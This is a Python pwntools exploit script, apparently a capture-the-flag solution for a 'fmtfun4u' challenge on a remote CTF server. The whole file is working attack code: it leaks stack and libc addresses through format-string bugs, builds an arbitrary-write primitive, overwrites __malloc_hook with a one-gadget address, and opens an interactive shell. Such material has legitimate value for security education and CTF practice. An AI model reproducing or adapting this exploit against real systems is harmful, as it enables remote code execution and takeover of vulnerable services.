from pwn import *

context.arch = "amd64"
context.terminal = ['tmux', 'splitw', '-h']
context.buffer_size = 0xffff

libc = ELF("./libc.so.6")

#r = process('./fmtfun4u', env = {"LD_PRELOAD" : "./libc.so.6"})
#gdb.attach(proc.pidof(r)[0])
r = remote("csie.ctf.tw", 10136)

def s(text):
    global r
    r.recvuntil(':')
    r.send(text.ljust(16, '\x00'))

def s_hn(data, offset):
    if data: s("%{}c%{}$hn".format(data, offset))

# leak stack base
s("%6$p")
stack = int(r.recvuntil('\n').strip(),16) - 0xf0
print "stack base:", hex(stack)

# create infinite loop
counter = stack + 0xc
s_hn(counter & 0xffff, 11)
s_hn(9999, 37)

# leak libc base
s("%3$p")
libc.address = int(r.recvuntil('\n').strip(),16) - 0xc - 0x117550
print "libc base: ", hex(libc.address)

def _2_bytes_array(x):
    ans = []
    for _ in xrange(4):
        ans.append(x & 0xffff)
        x >>= 16
    return ans

def write(address, data):
    global r
    global stack
    print "address:", hex(address)
    print "data:", hex(data)
    buf = stack + 0x100
    for i,d in enumerate(_2_bytes_array(data)):
        for j,addr in enumerate(_2_bytes_array(address + 2 * i)):
            s_hn((buf + j * 2) & 0xffff, 11)
            s_hn(addr, 37)
        s_hn(d, 38)

__malloc_hook = libc.symbols["__malloc_hook"]

# overwrite __malloc_hook
write(__malloc_hook, libc.address + 0x4526a)

s("%100000c")

r.interactive()

